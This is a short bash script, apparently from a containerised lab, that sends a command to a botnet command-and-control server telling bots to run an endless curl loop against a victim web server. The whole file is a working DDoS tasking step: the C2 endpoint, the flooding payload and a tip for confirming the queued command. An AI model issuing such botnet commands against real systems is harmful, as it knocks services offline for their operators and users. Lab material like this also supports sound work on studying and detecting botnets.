#!/bin/bash

set -euo pipefail

C2_IP="172.18.0.2"
VICTIM_IP="172.18.0.10"

docker exec attacker curl -sS \
  -X POST \
  -H 'Content-Type: text/plain' \
  --data-binary "while true; do curl -s http://${VICTIM_IP}:80/ >/dev/null 2>&1; done &" \
  "http://${C2_IP}:9000/set"
echo ""
echo "DDoS command set. Bots will flood victim at ${VICTIM_IP}:80"
echo "Tip: verify with: docker exec attacker curl -sS http://${C2_IP}:9000/cmd"